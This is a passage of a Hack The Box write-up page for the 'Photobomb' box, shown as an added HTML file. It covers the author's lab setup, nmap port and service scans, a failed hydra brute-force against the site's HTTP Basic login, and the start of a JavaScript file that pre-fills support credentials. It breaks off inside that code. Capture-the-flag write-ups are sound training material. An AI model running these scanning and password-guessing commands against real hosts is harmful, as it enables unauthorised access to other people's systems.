@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;photobomb#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Photobomb<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-02-09</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#host-10-10-11-182">Host 10.10.11.182</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#nginx">Nginx</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#foothold-os-command-injection">Foothold (OS command injection)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#website-code-review">Website code review</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#sudo-permissions">Sudo permissions</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#inspecting-opt-cleanup-sh">Inspecting &#x2F;opt&#x2F;cleanup.sh</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#preparation-1">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2022-10-08</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/85231">slartibartfast</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.10</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-11-182">Host <code>10.10.11.182</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Photobomb using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP port.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE VERSION
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Photobomb is running Linux, and the
+version of SSH suggests that it might be Ubuntu.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
+</span><span class="z-text z-plain">|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
+</span><span class="z-text z-plain">|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to http://photobomb.htb/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP service.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script indicates that the Nginx server redirects to
+<code>http://photobomb.htb/</code>. I'll add it to my <code>/etc/hosts</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.182 photobomb.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Now I'll run <code>nmap</code>'s default scripts on the web server once again.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>photobomb.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Photobomb
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="nginx">Nginx</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://photobomb.htb/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/domain-homepage.png" alt="Domain homepage" /></p>
+<p>It's a website promoting Photobomb. It's unclear what it's really about, it
+states 'You will soon be making an amazing income selling premium photographic
+gifts' and gives us a link to <code>/printer</code>, presumably to access our printer.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<h4 id="exploration-1">Exploration</h4>
+<p>If we browse to <code>http://photobomb.htb/printer</code>, we're asked to authenticate
+using HTTP authentication. The homepage indicates that the credentials are in
+our welcome pack, but since we don't have it, we'll have to find them.</p>
+<p>If we check this login request's response using Burp Suite, we see that it uses
+the 'Basic' scheme with a realm set to 'Admin Area'. It might suggest that
+<code>admin</code> is a valid username.</p>
+<p>Let's use <code>hydra</code> to try finding valid credentials using
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
+for the usernames and
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
+for the passwords.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>P</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>photobomb.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http-get<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/printer<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">1 of 1 target completed, 0 valid password found
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It failed.</p>
+<p>If we enter an invalid URL, we also get a custom web page.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/domain-404-page.png" alt="Domain 404 page" /></p>
+<p>It indicates that this website is using Sinatra. What's this?</p>
+<blockquote>
+<p>Sinatra is a DSL for quickly creating web applications in Ruby with minimal
+effort.</p>
+<p>— <a href="https://github.com/sinatra/sinatra">GitHub</a></p>
+</blockquote>
+<h4 id="source-code-review">Source code review</h4>
+<p>If we check the source code of the web page, we find a link to <code>/photobomb.js</code>:</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-storage z-type z-function z-ts">function</span> <span class="z-meta z-definition z-function z-ts"><span class="z-entity z-name z-function z-ts">init</span></span><span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-whitespace z-comment z-leading z-ts">    </span><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts">    <span class="z-keyword z-control z-conditional z-ts">if</span> <span class="z-meta z-brace z-round z-ts">(</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts">        <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">cookie</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">match</span></span><span class="z-meta z-brace z-round z-ts">(</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts">            <span class="z-string z-regexp z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">/</span><span class="z-keyword z-control z-anchor z-regexp">^</span><span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-regexp">.</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span>;<span class="z-punctuation z-definition z-group z-regexp">)</span></span><span class="z-keyword z-operator z-quantifier z-regexp">?</span><span class="z-constant z-other z-character-class z-regexp">\s</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span>isPhotoBombTechSupport<span class="z-constant z-other z-character-class z-regexp">\s</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span>=<span class="z-constant z-other z-character-class z-regexp">\s</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span><span class="z-constant z-other z-character-class z-set z-regexp"><span class="z-punctuation z-definition z-character-class z-regexp">[</span><span class="z-keyword z-operator z-negation z-regexp">^</span>;<span class="z-punctuation z-definition z-character-class z-regexp">]</span></span><span class="z-keyword z-operator z-quantifier z-regexp">+</span><span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-regexp">.</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span><span class="z-punctuation z-definition z-group z-regexp">)</span></span><span class="z-keyword z-operator z-quantifier z-regexp">?</span><span class="z-keyword z-control z-anchor z-regexp">$</span><span class="z-punctuation z-definition z-string z-end z-ts">/</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts">        <span class="z-meta z-brace z-round z-ts">)</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-brace z-round z-ts">)</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">        <span class="z-support z-variable z-dom z-ts">document</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">getElementsByClassName</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>creds<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-array z-literal z-ts"><span class="z-meta z-brace z-square z-ts">[</span><span class="z-constant z-numeric z-decimal z-ts">0</span><span class="z-meta z-brace z-square z-ts">]</span></span>
